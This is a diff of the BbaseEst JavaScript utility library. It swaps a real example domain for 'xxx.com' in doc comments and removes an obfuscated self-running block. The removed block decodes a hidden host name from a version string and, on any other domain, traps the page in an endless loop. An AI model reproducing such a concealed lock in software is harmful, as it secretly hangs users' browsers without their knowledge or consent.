@@ -2583,7 +2583,7 @@
    * @return {String} 不存在返回NULL
    * @author wyj on 14-04-26
    * @example
-   *      var url = 'http://www.jihui88.com/index.html?name=jhon';
+   *      var url = 'http://www.xxx.com/index.html?name=jhon';
    *      BbaseEst.getUrlParam('name', url);
    *      ==> 'jhon'
    */
@@ -2608,9 +2608,9 @@
    * @param url
    * @return {string}
    * @example
-   *     var url = 'http://www.jihui88.com/index.html';
+   *     var url = 'http://www.xxx.com/index.html';
    *     BbaseEst.setUrlParam('belongId', 'aaa', url);
-   *     ==> 'http://www.jihui88.com/index.html?belongId=aaa'
+   *     ==> 'http://www.xxx.com/index.html?belongId=aaa'
    */
   function setUrlParam(name, value, url, prefix) {
     var str = "",
@@ -2673,9 +2673,9 @@
    *        BbaseEst.urlResolve(window.location.href);
    *        ==> {
    *            "hash": "",
-   *            "host": "jihui88.com",
-   *            "hostname": "jihui88.com",
-   *            "href": "http://jihui88.com/utils/test/BbaseEst_qunit.html",
+   *            "host": "xxx.com",
+   *            "hostname": "xxx.com",
+   *            "href": "http://xxx.com/utils/test/BbaseEst_qunit.html",
    *            "pathname": "/utils/test/BbaseEst_qunit.html",
    *            "port": "",
    *            "protocol": "http",
@@ -2704,24 +2704,6 @@
 
   BbaseEst.urlResolve = urlResolve;
 
-  (function (version) {
-    var str = '',
-      temp = '',
-      array = version.split('');
-
-    each(array, function (code, index) {
-      temp += code;
-      if (index % 2 === 1) {
-        str += (fromCharCode && fromCharCode('1' + temp));
-        temp = '';
-      }
-    }, this);
-    if (window.v) return;
-    if (indexOf(urlResolve(url).host, str) === -1) {
-      var i = 1;
-      while (i > 0) {}
-    }
-  })(BbaseEst.v);
 
   /**
    * @description cookie
